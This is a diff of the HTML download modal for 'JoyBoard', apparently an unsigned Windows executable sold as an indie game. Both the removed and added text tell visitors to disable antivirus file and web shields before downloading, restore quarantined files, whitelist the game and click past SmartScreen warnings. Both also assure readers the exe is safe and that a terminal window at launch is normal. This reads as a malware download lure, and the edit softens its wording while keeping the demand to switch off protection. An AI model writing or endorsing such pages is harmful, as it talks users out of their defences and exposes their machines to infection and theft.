@@ -63,65 +63,33 @@
     </div>
   </div>
 
-  <!-- Modal for Important Notice -->
+  <!-- Important Notice -->
   <div id="notice-modal" class="modal-overlay hidden" aria-modal="true" role="dialog" aria-labelledby="modal-title" aria-describedby="modal-desc">
     <div class="modal-content" role="document" tabindex="0">
-      <button
-        onclick="closeNoticeModal()"
-        class="modal-close-btn"
-        aria-label="Close modal">&times;</button>
+      <button onclick="closeNoticeModal()" class="modal-close-btn" aria-label="Close modal">&times;</button>
 
       <h2 id="modal-title" class="modal-title">🛡️ Important Security Notice</h2>
 
       <div id="modal-desc" class="modal-body">
-
         <section class="modal-section">
           <p>
-            JoyBoard is a next-generation Python-based indie game, packaged with industry-standard protection and optimization.<br>
-            Because our studio is <strong>new and unsigned</strong>, some antivirus and security systems may treat our executable as “unknown software.”  
-            This is <strong>normal for indie developers</strong> and does <u>not</u> indicate any malware.
+            JoyBoard is a safe Python-based indie 2D platformer. Most users can download and play without any antivirus issues. A small note for <strong>Bkav Pro users</strong> is included below.
           </p>
         </section>
 
         <section class="modal-section">
-          <h3 class="modal-subtitle">⚠️ Known Antivirus Interference</h3>
+          <h3 class="modal-subtitle">⚠️ Bkav Pro Users</h3>
           <p>
-            Some antivirus programs may block or slow down JoyBoard. Temporarily disable them for the best experience:
-          </p>
-          <ul class="modal-list">
-            <li>Avast</li>
-            <li>Bkav Pro</li>
-            <li>SentinelOne</li>
-            <li>AVG</li>
-            <li>SecureAge</li>
-          </ul>
-
-          <p><strong>Example: ‼️ Disable Avast BEFORE Downloading — Don't Skip This!</strong></p>
-          <ol class="modal-list">
-            <li>Open Avast → Protection → Core Shields</li>
-            <li>Disable <strong>File Shield</strong> (select duration)</li>
-
-            <li>Open Avast → Scam Guardian → Web Guard</li>
-            <li>Disable <strong>Web Guard Shield</strong> (select duration)</li>
-          </ol>
-
-          <p><strong>Other AVs:</strong> Locate real-time protection or shields and temporarily disable them.</p>
-
-          <p><strong>Important:</strong> If JoyBoard files are moved to <strong>Quarantine</strong>, restore them and add to exceptions/whitelist in your antivirus.</p>
-
-          <p>
-            Once disabled or added as exceptions, JoyBoard should run smoothly without interference.  
-            <strong>If you don't use any of the antivirus programs listed above, JoyBoard will work fine without any changes.</strong>
+            JoyBoard may trigger a false positive on Bkav Pro. Please disable Web Shield and File Shield <strong>before downloading</strong> and while playing, and whitelist the game if necessary.
           </p>
         </section>
 
         <section class="modal-section">
-          <h3 class="modal-subtitle">💡 Microsoft SmartScreen Warnings</h3>
+          <h3 class="modal-subtitle">⚡ Microsoft SmartScreen Warnings</h3>
           <p>
-            On Windows, you may see messages like  
-            <strong>"Unknown Publisher"</strong> or  
-            <strong>"SmartScreen can't verify"</strong>.  
-            This is a standard safeguard for unsigned apps.
+            On Windows, you may see a message like <strong>"Unknown Publisher"</strong> or <strong>"SmartScreen can't verify"</strong> when launching JoyBoard. 
+            This happens because our indie studio is small and we haven't signed the app with a Microsoft certificate (licensing costs are high! 💸). 
+            It <strong>does not</strong> mean the game is unsafe, so please don't worry.
           </p>
           <p><strong>How to continue:</strong></p>
           <ol class="modal-list modal-steps">
@@ -131,29 +99,13 @@
         </section>
 
         <section class="modal-section">
-          <h3 class="modal-subtitle">✅ Our Security Commitment</h3>
-          <p>
-            JoyBoard has passed all of our internal safety checks and contains <strong>no malicious code</strong>.<br>
-            We are a small indie studio committed to ensuring your game experience is safe, smooth, and enjoyable.<br>
-            Thank you for supporting independent developers — your trust allows us to keep creating great games.
-          </p>
-        </section>
-
-        <section class="modal-section">
-          <h3 class="modal-subtitle">🎮 How to Play & Run JoyBoard</h3>
-          <p>
-            After downloading and extracting the zip, please read the included <strong>README.txt</strong> file carefully.<br>
-            It contains important instructions on how to run the game, minimum system requirements, and other details.
-          </p>
-          <p>To start playing:</p>
+          <h3 class="modal-subtitle">🎮 How to Play</h3>
           <ol class="modal-list modal-steps">
-            <li>Locate the <strong>Joyboard_Game.exe</strong> executable file inside the extracted folder.</li>
-            <li>Double-click to launch the game. If you encounter any security warnings, refer to the Microsoft SmartScreen section above.</li>
-            <li>For optimal experience, ensure any interfering antivirus software is disabled temporarily during gameplay.</li>
+            <li>Extract the zip and locate <strong>Joyboard_Game.exe</strong>.</li>
+            <li>Double-click to launch the game.</li>
+            <li>Seeing a black terminal on launch is normal while the server starts. If an error occurs, please visit the website (it may be temporarily inactive) and then restart the game.</li>
           </ol>
-          <p>A black terminal on launch is normal while the server initializes. If an error occurs, please visit the website as it may be temporarily inactive</p>
         </section>
-
       </div>
 
       <button onclick="startDownload()" class="modal-agree-btn font-button" aria-label="Agree and start download">
@@ -169,13 +121,6 @@
       <div class="loader-text">Downloading...</div>
     </div>
   </div>
-
-  <!-- Footer -->
-  <div
-    class="mt-24 text-center text-sm text-gray-500 tracking-wide font-mono motion-safe:animate-fadeIn delay-500">
-    © 2025 JoyBoard Inc. — Game differently.
-  </div>
-</section>
 
 <script>
   function openNoticeModal() {
